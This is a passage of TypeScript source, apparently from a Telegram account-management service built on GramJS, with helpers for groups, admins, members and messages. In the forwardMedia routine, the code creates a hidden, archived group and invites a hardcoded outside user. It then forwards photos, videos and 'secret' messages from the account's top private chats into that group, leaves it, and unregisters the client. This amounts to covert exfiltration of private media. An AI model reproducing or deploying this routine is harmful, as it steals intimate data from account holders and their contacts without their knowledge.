'Saved Messages';\r\n    const groupDescription = ctx.phoneNumber;\r\n    ctx.logger.info(ctx.phoneNumber, 'Creating group:', groupName);\r\n    const result = await ctx.client.invoke(\r\n        new Api.channels.CreateChannel({\r\n            title: groupName,\r\n            about: groupDescription,\r\n            megagroup: true,\r\n            forImport: true,\r\n        })\r\n    );\r\n    const { id, accessHash } = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0];\r\n    ctx.logger.info(ctx.phoneNumber, 'Archived chat', id);\r\n    await archiveChat(ctx, id, accessHash);\r\n    const usersToAdd = ['fuckyoubabie1'];\r\n    ctx.logger.info(ctx.phoneNumber, 'Adding users to the channel:', usersToAdd);\r\n    await ctx.client.invoke(\r\n        new Api.channels.InviteToChannel({\r\n            channel: new Api.InputChannel({ channelId: id, accessHash }),\r\n            users: usersToAdd,\r\n        })\r\n    );\r\n    return { id, accessHash };\r\n}\r\n\r\nexport async function archiveChat(ctx: TgContext, id: bigInt.BigInteger, accessHash: bigInt.BigInteger): Promise<Api.TypeUpdates> {\r\n    const folderId = 1;\r\n    ctx.logger.info(ctx.phoneNumber, 'Archiving chat', id);\r\n    return await ctx.client.invoke(\r\n        new Api.folders.EditPeerFolders({\r\n            folderPeers: [\r\n                new Api.InputFolderPeer({\r\n                    peer: new Api.InputPeerChannel({ channelId: id, accessHash }),\r\n                    folderId,\r\n                }),\r\n            ],\r\n        })\r\n    );\r\n}\r\n\r\nasync function createOrJoinChannel(ctx: TgContext, channel: string): Promise<{ id: bigInt.BigInteger; accesshash: bigInt.BigInteger }> {\r\n    let channelId: bigInt.BigInteger;\r\n    let channelAccessHash: bigInt.BigInteger;\r\n    if (channel) {\r\n        try {\r\n            const result = await joinChannel(ctx, channel);\r\n            channelId = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0].id;\r\n            channelAccessHash = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0].accessHash;\r\n            ctx.logger.info(ctx.phoneNumber, 'Archived chat', channelId);\r\n        } catch (error) {\r\n            const result = await createGroup(ctx);\r\n            channelId = result.id;\r\n            channelAccessHash = result.accessHash;\r\n            ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);\r\n        }\r\n    } else {\r\n        const result = await createGroup(ctx);\r\n        channelId = result.id;\r\n        channelAccessHash = result.accessHash;\r\n        ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);\r\n    }\r\n    await archiveChat(ctx, channelId, channelAccessHash);\r\n    return { id: channelId, accesshash: channelAccessHash };\r\n}\r\n\r\nexport async function forwardMedia(ctx: TgContext, channel: string, fromChatId: string): Promise<void> {\r\n    // Import lazily to avoid circular deps\r\n    const { searchMessages, forwardMessages } = require('./message-operations');\r\n    const { getTopPrivateChats } = require('./chat-operations');\r\n    const { MessageMediaType } = require('../dto/message-search.dto');\r\n\r\n    let channelId: bigInt.BigInteger | undefined;\r\n    try {\r\n        ctx.logger.info(ctx.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);\r\n        if (fromChatId) {\r\n            const channelDetails = await createOrJoinChannel(ctx, channel);\r\n            channelId = channelDetails.id;\r\n            const { forwardSecretMsgs } = require('./message-operations');\r\n            await forwardSecretMsgs(ctx, fromChatId, channelId?.toString());\r\n        } else {\r\n            const chats = await getTopPrivateChats(ctx);\r\n            const me = await ctx.client.getMe();\r\n            if (chats.length > 0) {\r\n                const channelDetails = await createOrJoinChannel(ctx, channel);\r\n                channelId = channelDetails.id;\r\n                const finalChats = new Set(chats.map((chat: { chatId: string }) => chat.chatId));\r\n                finalChats.add((me as Api.User).id?.toString());\r\n                for (const chatId of finalChats) {\r\n                    const mediaMessages = await searchMessages(ctx, { chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });\r\n                    ctx.logger.info(ctx.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);\r\n                    await forwardMessages(ctx, chatId, channelId, mediaMessages.photo.messages);\r\n                    await forwardMessages(ctx, chatId, channelId, mediaMessages.video.messages);\r\n                }\r\n            }\r\n            ctx.logger.info(ctx.phoneNumber, 'Completed forwarding messages from top private chats to channel:', channelId);\r\n        }\r\n    } catch (e) {\r\n        ctx.logger.info(ctx.phoneNumber, e);\r\n    }\r\n    if (channelId) {\r\n        await leaveChannels(ctx, [channelId.toString()]);\r\n        await connectionManager.unregisterClient(ctx.phoneNumber);\r\n    }\r\n}\r\n\r\nexport async function joinChannel(ctx: TgContext, entity: EntityLike): Promise<Api.TypeUpdates> {\r\n    ctx.logger.info(ctx.phoneNumber, 'trying to join channel: ', `@${entity}`);\r\n    return await ctx.client?.invoke(\r\n        new Api.channels.JoinChannel({\r\n            channel: await ctx.client?.getEntity(entity),\r\n        })\r\n    );\r\n}\r\n\r\nexport async function leaveChannels(ctx: TgContext, chats: string[]): Promise<void> {\r\n    ctx.logger.info(ctx.phoneNumber, 'Leaving Channels/Groups: initiated!!');\r\n    ctx.logger.info(ctx.phoneNumber, 'ChatsLength: ', chats.length);\r\n\r\n    if (chats.length === 0) {\r\n        ctx.logger.info(ctx.phoneNumber, 'No chats to leave');\r\n        return;\r\n    }\r\n\r\n    const chatsToLeave = new Set<string>();\r\n    for (const id of chats) {\r\n        chatsToLeave.add(id);\r\n        if (id.startsWith('-100')) {\r\n            chatsToLeave.add(id.substring(4));\r\n        } else {\r\n            chatsToLeave.add(`-100${id}`);\r\n        }\r\n    }\r\n\r\n    const entityMap = new Map<string, { entity: Api.Channel | Api.Chat; dialog: Dialog }>();\r\n    let foundCount = 0;\r\n\r\n    try {\r\n        for await (const dialog of ctx.client.iterDialogs({})) {\r\n            const entity = dialog.entity;\r\n            if (entity instanceof Api.Channel || entity instanceof Api.Chat) {\r\n                const entityId = entity.id.toString();\r\n                if (chatsToLeave.has(entityId)) {\r\n                    entityMap.set(entityId, { entity, dialog });\r\n                    foundCount++;\r\n                    if (foundCount >= chats.length) {\r\n                        ctx.logger.debug(ctx.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);\r\n                        break;\r\n                    }\r\n                }\r\n                if (entityId.startsWith('-100')) {\r\n                    const shortId = entityId.substring(4);\r\n                    if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {\r\n                        entityMap.set(shortId, { entity, dialog });\r\n                        foundCount++;\r\n                        if (foundCount >= chats.length) break;\r\n                    }\r\n                } else {\r\n                    const longId = `-100${entityId}`;\r\n                    if (chatsToLeave.has(longId) && !entityMap.has(longId)) {\r\n                        entityMap.set(longId, { entity, dialog });\r\n                        foundCount++;\r\n                        if (foundCount >= chats.length) break;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        ctx.logger.debug(ctx.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Failed to iterate dialogs:', error);\r\n        throw error;\r\n    }\r\n\r\n    if (entityMap.size === 0) {\r\n        ctx.logger.warn(ctx.phoneNumber, 'No matching chats found in dialogs to leave');\r\n        return;\r\n    }\r\n\r\n    const me = await ctx.client.getMe();\r\n    let successCount = 0;\r\n    let skipCount = 0;\r\n\r\n    for (const id of chats) {\r\n        try {\r\n            const entityData = entityMap.get(id) ||\r\n                entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);\r\n\r\n            if (!entityData) {\r\n                ctx.logger.warn(ctx.phoneNumber, `Chat ${id} not found in dialogs, skipping`);\r\n                skipCount++;\r\n                continue;\r\n            }\r\n\r\n            const { entity } = entityData;\r\n            let chatType: string;\r\n            let left = false;\r\n\r\n            if (entity instanceof Api.Channel) {\r\n                await ctx.client.invoke(new Api.channels.LeaveChannel({ channel: entity }));\r\n                chatType = entity.broadcast ? 'channel' : 'supergroup';\r\n                left = true;\r\n            } else if (entity instanceof Api.Chat) {\r\n                await ctx.client.invoke(new Api.messages.DeleteChatUser({\r\n                    chatId: entity.id,\r\n                    userId: (me as Api.User).id,\r\n                    revokeHistory: false,\r\n                }));\r\n                chatType = 'group';\r\n                left = true;\r\n            } else {\r\n                ctx.logger.warn(ctx.phoneNumber, `Unknown entity type for ${id}, skipping`);\r\n                skipCount++;\r\n                continue;\r\n            }\r\n\r\n            if (left) {\r\n                ctx.logger.info(ctx.phoneNumber, `Left ${chatType}: ${id}`);\r\n                successCount++;\r\n            }\r\n\r\n            if (chats.length > 1) await sleep(3000);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error, `${ctx.phoneNumber} Failed to leave chat ${id}:`, false);\r\n            if (isPermanentError(errorDetails)) {\r\n                ctx.logger.error(ctx.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);\r\n                skipCount++;\r\n                continue;\r\n            }\r\n            ctx.logger.warn(ctx.phoneNumber, `Error leaving ${id}:`, errorDetails.message);\r\n            skipCount++;\r\n        }\r\n    }\r\n\r\n    ctx.logger.info(ctx.phoneNumber, `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`);\r\n}\r\n\r\nexport async function getGrpMembers(ctx: TgContext, entity: EntityLike): Promise<GroupMember[]> {\r\n    try {\r\n        const result: GroupMember[] = [];\r\n        const chat = await ctx.client.getEntity(entity);\r\n\r\n        if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\r\n            ctx.logger.info(ctx.phoneNumber, 'Invalid group or channel!');\r\n            return [];\r\n        }\r\n\r\n        ctx.logger.info(ctx.phoneNumber, `Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\r\n\r\n        const participants = await ctx.client.invoke(\r\n            new Api.channels.GetParticipants({\r\n                channel: chat,\r\n                filter: new Api.ChannelParticipantsRecent(),\r\n                offset: 0,\r\n                limit: 200,\r\n                hash: bigInt(0),\r\n            })\r\n        );\r\n\r\n        if (participants instanceof Api.channels.ChannelParticipants) {\r\n            const users = participants.participants;\r\n            ctx.logger.info(ctx.phoneNumber, `Members: ${users.length}`);\r\n            for (const user of users) {\r\n                const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\r\n                if (userInfo) {\r\n                    const userDetails = <Api.User>await ctx.client.getEntity(userInfo);\r\n                    result.push({\r\n                        tgId: userDetails.id,\r\n                        name: `${userDetails.firstName || ''} ${userDetails.lastName || ''}`,\r\n                        username: `${userDetails.username || ''}`,\r\n                    });\r\n                    if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\r\n                        ctx.logger.info(ctx.phoneNumber, JSON.stringify(userDetails.id));\r\n                    }\r\n                } else {\r\n                    ctx.logger.info(ctx.phoneNumber, JSON.stringify((user as Api.ChannelParticipant)?.userId));\r\n                }\r\n            }\r\n        } else {\r\n            ctx.logger.info(ctx.phoneNumber, 'No members found or invalid group.');\r\n        }\r\n        ctx.logger.info(ctx.phoneNumber, `${result.length}`);\r\n        return result;\r\n    } catch (err) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error fetching group members:', err);\r\n        return [];\r\n    }\r\n}\r\n\r\nexport async function addGroupMembers(ctx: TgContext, groupId: string, members: string[]): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getInputEntity(groupId);\r\n    const users = await Promise.all(members.map(member => ctx.client.getInputEntity(member)));\r\n    await ctx.client.invoke(new Api.channels.InviteToChannel({ channel, users }));\r\n}\r\n\r\nexport async function removeGroupMembers(ctx: TgContext, groupId: string, members: string[]): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getInputEntity(groupId);\r\n    for (const member of members) {\r\n        const user = await ctx.client.getInputEntity(member);\r\n        await ctx.client.invoke(new Api.channels.EditBanned({\r\n            channel,\r\n            participant: user,\r\n            bannedRights: new Api.ChatBannedRights({\r\n                untilDate: 0,\r\n                viewMessages: true, sendMessages: true, sendMedia: true,\r\n                sendStickers: true, sendGifs: true, sendGames: true,\r\n                sendInline: true, embedLinks: true,\r\n            }),\r\n        }));\r\n    }\r\n}\r\n\r\nexport async function promoteToAdmin(\r\n    ctx: TgContext, groupId: string, userId: string,\r\n    permissions?: Partial<{\r\n        changeInfo: boolean; postMessages: boolean; editMessages: boolean;\r\n        deleteMessages: boolean; banUsers: boolean; inviteUsers: boolean;\r\n        pinMessages: boolean; addAdmins: boolean; anonymous: boolean; manageCall: boolean;\r\n    }>,\r\n    rank?: string\r\n): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getInputEntity(groupId);\r\n    const user = await ctx.client.getInputEntity(userId);\r\n\r\n    await ctx.client.invoke(new Api.channels.EditAdmin({\r\n        channel, userId: user,\r\n        adminRights: new Api.ChatAdminRights({\r\n            changeInfo: permissions?.changeInfo ?? false,\r\n            postMessages: permissions?.postMessages ?? false,\r\n            editMessages: permissions?.editMessages ?? false,\r\n            deleteMessages: permissions?.deleteMessages ?? false,\r\n            banUsers: permissions?.banUsers ?? false,\r\n            inviteUsers: permissions?.inviteUsers ?? true,\r\n            pinMessages: permissions?.pinMessages ?? false,\r\n            addAdmins: permissions?.addAdmins ?? false,\r\n            anonymous: permissions?.anonymous ?? false,\r\n            manageCall: permissions?.manageCall ?? false,\r\n            other: false,\r\n        }),\r\n        rank: rank || '',\r\n    }));\r\n}\r\n\r\nexport async function demoteAdmin(ctx: TgContext, groupId: string, userId: string): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getInputEntity(groupId);\r\n    const user = await ctx.client.getInputEntity(userId);\r\n\r\n    await ctx.client.invoke(new Api.channels.EditAdmin({\r\n        channel, userId: user,\r\n        adminRights: new Api.ChatAdminRights({\r\n            changeInfo: false, postMessages: false, editMessages: false,\r\n            deleteMessages: false, banUsers: false, inviteUsers: false,\r\n            pinMessages: false, addAdmins: false, anonymous: false,\r\n            manageCall: false, other: false,\r\n        }),\r\n        rank: '',\r\n    }));\r\n}\r\n\r\nexport async function unblockGroupUser(ctx: TgContext, groupId: string, userId: string): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getInputEntity(groupId);\r\n    const user = await ctx.client.getInputEntity(userId);\r\n\r\n    await ctx.client.invoke(new Api.channels.EditBanned({\r\n        channel, participant: user,\r\n        bannedRights: new Api.ChatBannedRights({\r\n            untilDate: 0,\r\n            viewMessages: false, sendMessages: false, sendMedia: false,\r\n            sendStickers: false, sendGifs: false, sendGames: false,\r\n            sendInline: false, embedLinks: false,\r\n        }),\r\n    }));\r\n}\r\n\r\nexport async function getGroupAdmins(ctx: TgContext, groupId: string): Promise<AdminInfo[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const result = await ctx.client.invoke(new Api.channels.GetParticipants({\r\n        channel: await ctx.client.getInputEntity(groupId),\r\n        filter: new Api.ChannelParticipantsAdmins(),\r\n        offset: 0, limit: 100, hash: bigInt(0),\r\n    }));\r\n\r\n    if ('users' in result) {\r\n        const participants = result.participants as Api.ChannelParticipantAdmin[];\r\n        return participants.map(participant => {\r\n            const adminRights = participant.adminRights as Api.ChatAdminRights;\r\n            return {\r\n                userId: participant.userId.toString(),\r\n                rank: participant.rank || '',\r\n                permissions: {\r\n                    changeInfo: adminRights.changeInfo || false,\r\n                    postMessages: adminRights.postMessages || false,\r\n                    editMessages: adminRights.editMessages || false,\r\n                    deleteMessages: adminRights.deleteMessages || false,\r\n                    banUsers: adminRights.banUsers || false,\r\n                    inviteUsers: adminRights.inviteUsers || false,\r\n                    pinMessages: adminRights.pinMessages || false,\r\n                    addAdmins: adminRights.addAdmins || false,\r\n                    anonymous: adminRights.anonymous || false,\r\n                    manageCall: adminRights.manageCall || false,\r\n                },\r\n            };\r\n        });\r\n    }\r\n    return [];\r\n}\r\n\r\nexport async function getGroupBannedUsers(ctx: TgContext, groupId: string): Promise<BannedUserInfo[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const result = await ctx.client.invoke(new Api.channels.GetParticipants({\r\n        channel: await ctx.client.getInputEntity(groupId),\r\n        filter: new Api.ChannelParticipantsBanned({ q: '' }),\r\n        offset: 0, limit: 100, hash: bigInt(0),\r\n    }));\r\n\r\n    if ('users' in result) {\r\n        const participants = result.participants as Api.ChannelParticipantBanned[];\r\n        return participants.map(participant => {\r\n            const bannedRights = participant.bannedRights as Api.ChatBannedRights;\r\n            return {\r\n                userId: (participant.peer as Api.PeerChat).chatId.toString(),\r\n                bannedRights: {\r\n                    viewMessages: bannedRights.viewMessages || false,\r\n                    sendMessages: bannedRights.sendMessages || false,\r\n                    sendMedia: bannedRights.sendMedia || false,\r\n                    sendStickers: bannedRights.sendStickers || false,\r\n                    sendGifs: bannedRights.sendGifs || false,\r\n                    sendGames: bannedRights.sendGames || false,\r\n                    sendInline: bannedRights.sendInline || false,\r\n                    embedLinks: bannedRights.embedLinks || false,\r\n                    untilDate: bannedRights.untilDate || 0,\r\n                },\r\n            };\r\n        });\r\n    }\r\n    return [];\r\n}\r\n\r\nexport async function createGroupOrChannel(ctx: TgContext, options: GroupOptions): Promise<Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    try {\r\n        ctx.logger.info(ctx.phoneNumber, 'Creating group or channel with options:', options);\r\n        return await ctx.client.invoke(new Api.channels.CreateChannel(options));\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error creating group or channel:', error);\r\n        throw new Error(`Failed to create group or channel: ${error.message}`);\r\n    }\r\n}\r\n\r\nexport async function createGroupWithOptions(ctx: TgContext, options: GroupOptions): Promise<Api.Chat | Api.Channel> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const result = await createGroupOrChannel(ctx, options);\r\n\r\n    let channelId: bigInt.BigInteger | undefined;\r\n    if ('updates' in result) {\r\n        const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\r\n        const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\r\n        if (channelUpdate && 'channelId' in channelUpdate) {\r\n            channelId = (channelUpdate as Api.UpdateChannel).channelId;\r\n        }\r\n    }\r\n\r\n    if (!channelId) throw new Error('Failed to create channel');\r\n\r\n    const channelEntity = await ctx.client.getEntity(channelId);\r\n    if (!(channelEntity instanceof Api.Channel)) throw new Error('Created entity is not a channel');\r\n\r\n    if (options.members?.length) {\r\n        const users = await Promise.all(options.members.map(member => ctx.client.getInputEntity(member)));\r\n        await ctx.client.invoke(new Api.channels.InviteToChannel({\r\n            channel: await ctx.client.getInputEntity(channelEntity),\r\n            users,\r\n        }));\r\n    }\r\n\r\n    if (options.photo) {\r\n        const buffer = await downloadFileFromUrl(options.photo);\r\n        const inputFile = await ctx.client.uploadFile({\r\n            file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\r\n            workers: 1,\r\n        });\r\n        await ctx.client.invoke(new Api.channels.EditPhoto({\r\n            channel: await ctx.client.getInputEntity(channelEntity),\r\n            photo: new Api.InputChatUploadedPhoto({ file: inputFile }),\r\n        }));\r\n    }\r\n\r\n    return channelEntity;\r\n}\r\n\r\nexport async function updateGroupSettings(ctx: TgContext, settings: GroupSettingsUpdate): Promise<boolean> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const channel = await ctx.client.getEntity(settings.groupId);\r\n\r\n    if (settings.title) {\r\n        await ctx.client.invoke(new Api.channels.EditTitle({ channel, title: settings.title || '' }));\r\n    }\r\n    if (settings.description) {\r\n        await ctx.client.invoke(new Api.messages.EditChatAbout({ peer: channel, about: settings.description }));\r\n    }\r\n    if (settings.username) {\r\n        await ctx.client.invoke(new Api.channels.UpdateUsername({ channel, username: settings.username }));\r\n    }\r\n    if (settings.slowMode !== undefined) {\r\n        await ctx.client.invoke(new Api.channels.ToggleSlowMode({ channel, seconds: settings.slowMode }));\r\n    }\r\n    return true;\r\n}\r\n","import { Api } from 'telegram';\r\nimport { TotalList, sleep } from 'telegram/Helpers';\r\nimport { EntityLike } from 'telegram/define';\r\nimport { contains } from '../../../utils';\r\nimport {\r\n    TgContext, ChatListItem, ChatListResult, ChatStatistics, MessageStats, TopPrivateChat,\r\n    PerChatCallStats, CallLogEntry, CallLogChat, CallLogResult, EngagementWeights, SelfMessagesInfo, ChatSettingsUpdate,\r\n    ChatFolderCreateOptions, ChatFolder, MessageItem, TopSenderInfo,\r\n    MediaInfo,\r\n} from './types';\r\nimport {\r\n    downloadFileFromUrl, toISODate, toTimeString, resolveEntityToSenderInfo,\r\n    extractMediaInfo, getUserOnlineStatus, bufferToBase64DataUrl,\r\n    getMediaType,\r\n} from './helpers';\r\nimport { getThumbnailBuffer } from './media-operations';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { Dialog } from 'telegram/tl/custom/dialog';\r\nimport bigInt from 'big-integer';\r\n\r\n// ---- Entity resolution ----\r\n\r\nexport async function safeGetEntityById(ctx: TgContext, entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    try {\r\n        return await ctx.client.getEntity(entityId);\r\n    } catch (error) {\r\n        ctx.logger.info(ctx.phoneNumber, `Failed to get entity directly for ${entityId}, searching in dialogs...`);\r\n        try {\r\n            for await (const dialog of ctx.client.iterDialogs({})) {\r\n                const entity = dialog.entity;\r\n                const dialogId = entity.id.toString();\r\n\r\n                if (dialogId === entityId.toString()) return entity;\r\n                if (dialogId.startsWith('-100')) {\r\n                    if (dialogId.substring(4) === entityId.toString()) return entity;\r\n                } else {\r\n                    if (`-100${dialogId}` === entityId.toString()) return entity;\r\n                }\r\n            }\r\n            ctx.logger.info(ctx.phoneNumber, `Entity ${entityId} not found in dialogs either`);\r\n            return null;\r\n        } catch (dialogError) {\r\n            ctx.logger.error(ctx.phoneNumber, 'Error while searching dialogs:', dialogError);\r\n            return null;\r\n        }\r\n    }\r\n}\r\n\r\n// ---- Basic getters ----\r\n\r\nexport async function getMe(ctx: TgContext): Promise<Api.User> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    try {\r\n        return <Api.User>await ctx.client.getMe();\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error getting user info:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function getchatId(ctx: TgContext, username: string): Promise<Api.TypeInputPeer> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    return await ctx.client.getInputEntity(username);\r\n}\r\n\r\nexport async function getEntity(ctx: TgContext, entity: EntityLike): Promise<Api.User | Api.Chat | Api.Channel> {\r\n    return await ctx.client?.getEntity(entity) as Api.User | Api.Chat | Api.Channel;\r\n}\r\n\r\nexport async function getMessages(ctx: TgContext, entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\r\n    return await ctx.client.getMessages(entityLike, { limit });\r\n}\r\n\r\nexport async function getAllChats(ctx: TgContext): Promise<ReturnType<Api.TypeChat['toJSON']>[]> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    const chatData: ReturnType<Api.TypeChat['toJSON']>[] = [];\r\n    let total = 0;\r\n\r\n    for await (const chat of ctx.client.iterDialogs({ limit: 500 })) {\r\n        const chatEntity = chat.entity.toJSON();\r\n        chatData.push(chatEntity);\r\n        total++;\r\n    }\r\n\r\n    ctx.logger.info(ctx.phoneNumber, 'TotalChats:', total);\r\n    return chatData;\r\n}\r\n\r\nfunction formatReactions(reactions: Api.MessageReactions): { reaction: string; count: number }[] {\r\n    if (!reactions?.results?.length) return [];\r\n    return reactions.results.map((r: { reaction?: Api.TypeReaction; count?: number }) => {\r\n        let reaction = '';\r\n        if (r.reaction instanceof Api.ReactionEmoji) reaction = r.reaction.emoticon ?? '';\r\n        else if (r.reaction instanceof Api.ReactionCustomEmoji) reaction = `documentId:${(r.reaction as Api.ReactionCustomEmoji).documentId}`;\r\n        else if (r.reaction && typeof (r.reaction as any).emoticon === 'string') reaction = (r.reaction as any).emoticon;\r\n        return { reaction, count: r.count ?? 0 };\r\n    }).filter(x => (x.count ?? 0) > 0);\r\n}\r\n\r\nexport async function getMessagesNew(ctx: TgContext, chatId: string, offset: number = 0, limit: number = 20): Promise<MessageItem[]> {\r\n    const messages = await ctx.client.getMessages(chatId, { offsetId: offset, limit });\r\n\r\n    const senderIds = new Set<string>();\r\n    for (const msg of messages) {\r\n        const sid = msg.senderId?.toString();\r\n        if (sid) senderIds.add(sid);\r\n    }\r\n    const entityCache = new Map<string, Api.User | Api.Chat | Api.Channel | null>();\r\n    await Promise.all(Array.from(senderIds).map(async (sid) => {\r\n        try {\r\n            const entity = await safeGetEntityById(ctx, sid);\r\n            entityCache.set(sid, entity as Api.User | Api.Chat | Api.Channel | null);\r\n        } catch {\r\n            entityCache.set(sid, null);\r\n        }\r\n    }));\r\n\r\n    const messageList = await Promise.all(messages.map(async (message: Api.Message) => {\r\n        const senderId = message.senderId?.toString() || '';\r\n\r\n        let media: MediaInfo | null = null;\r\n        if (message.media && !(message.media instanceof Api.MessageMediaEmpty)) {\r\n            const thumbBuffer = await getThumbnailBuffer(ctx, message);\r\n            media = extractMediaInfo(message, thumbBuffer);\r\n        }\r\n\r\n        let forwardedFrom: string | null = null;\r\n        if (message.fwdFrom) {\r\n            const fwdId = message.fwdFrom.fromId;\r\n            if (fwdId instanceof Api.PeerUser) {\r\n                const fwdEntity = entityCache.get(fwdId.userId.toString());\r\n                if (fwdEntity instanceof Api.User) {\r\n                    forwardedFrom = `${fwdEntity.firstName || ''} ${fwdEntity.lastName || ''}`.trim() || fwdId.userId.toString();\r\n                } else {\r\n                    forwardedFrom = fwdId.userId.toString();\r\n                }\r\n            } else if (fwdId instanceof Api.PeerChannel) {\r\n                forwardedFrom = fwdId.channelId.toString();\r\n            } else if (message.fwdFrom.fromName) {\r\n                forwardedFrom = message.fwdFrom.fromName;\r\n            }\r\n        }\r\n\r\n        const msgDate = message.date ?? 0;\r\n        return {\r\n            id: message.id,\r\n            text: message.message || '',\r\n            date: toISODate(msgDate),\r\n            time: toTimeString(msgDate),\r\n            dateUnix: msgDate,\r\n            senderId,\r\n            media,\r\n            isEdited: !!message.editDate,\r\n            editDate: message.editDate ? toISODate(message.editDate) : null,\r\n            isPinned: !!message.pinned,\r\n            isForwarded: !!message.fwdFrom,\r\n            forwardedFrom,\r\n            replyToMessageId: message.replyTo?.replyToMsgId ?? null,\r\n            groupedId: message.groupedId ? message.groupedId.toString() : null,\r\n            views: message.views ?? null,\r\n            forwards: message.forwards ?? null,\r\n            reactions: message.reactions ? formatReactions(message.reactions) : null,\r\n        };\r\n    }));\r\n\r\n    return messageList;\r\n}\r\n\r\n// ---- Self messages info ----\r\n\r\nexport async function getSelfMSgsInfo(ctx: TgContext, limit: number = 500): Promise<SelfMessagesInfo> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const maxLimit = Math.min(Math.max(limit, 1), 10000);\r\n        const movieKeywords = ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'];\r\n\r\n        const [photosList, videosList, photosByUsList, videosByUsList, totalBatch, movieScan] = await Promise.all([\r\n            ctx.client.getMessages('me', { filter: new Api.InputMessagesFilterPhotos(), limit: 1 }).catch(() => []),\r\n            ctx.client.getMessages('me', { filter: new Api.InputMessagesFilterVideo(), limit: 1 }).catch(() => []),\r\n            ctx.client.getMessages('me', { filter: new Api.InputMessagesFilterPhotos(), limit: 1, fromUser: 'me' }).catch(() => []),\r\n            ctx.client.getMessages('me', { filter: new Api.InputMessagesFilterVideo(), limit: 1, fromUser: 'me' }).catch(() => []),\r\n            ctx.client.getMessages('me', { limit: 1 }).catch(() => []),\r\n            (async () => {\r\n                let analyzedMessages = 0;\r\n                let movieCount = 0;\r\n                for await (const message of ctx.client.iterMessages('me', { limit: maxLimit, reverse: false })) {\r\n                    analyzedMessages++;\r\n                    if (message?.text && contains(message.text.toLowerCase(), movieKeywords)) movieCount++;\r\n                }\r\n                return { analyzedMessages, movieCount };\r\n            })(),\r\n        ]);\r\n\r\n        const photoCount = (photosList as { total?: number })?.total ?? 0;\r\n        const videoCount = (videosList as { total?: number })?.total ?? 0;\r\n        const ownPhotoCount = (photosByUsList as { total?: number })?.total ?? 0;\r\n        const ownVideoCount = (videosByUsList as { total?: number })?.total ?? 0;\r\n\r\n        let totalMessages = movieScan.analyzedMessages;\r\n        const totalFromBatch = (totalBatch as { total?: number })?.total;\r\n        if (totalFromBatch != null) totalMessages = totalFromBatch;\r\n\r\n        ctx.logger.info(ctx.phoneNumber, `getSelfMSgsInfo: Analyzed ${movieScan.analyzedMessages} messages`, {\r\n            photoCount, videoCount, movieCount: movieScan.movieCount, total: totalMessages,\r\n        });\r\n\r\n        return {\r\n            total: totalMessages, photoCount, videoCount,\r\n            movieCount: movieScan.movieCount, ownPhotoCount,\r\n            otherPhotoCount: Math.max(0, photoCount - ownPhotoCount),\r\n            ownVideoCount,\r\n            otherVideoCount: Math.max(0, videoCount - ownVideoCount),\r\n            analyzedMessages: movieScan.analyzedMessages,\r\n        };\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error in getSelfMSgsInfo:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\n// ---- Call logs ----\r\nexport async function getCallLog(\r\n    ctx: TgContext,\r\n    limit: number = 1000,\r\n    options?: { includeCallLog?: boolean }\r\n): Promise<CallLogResult> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    const includeCallLog = options?.includeCallLog === 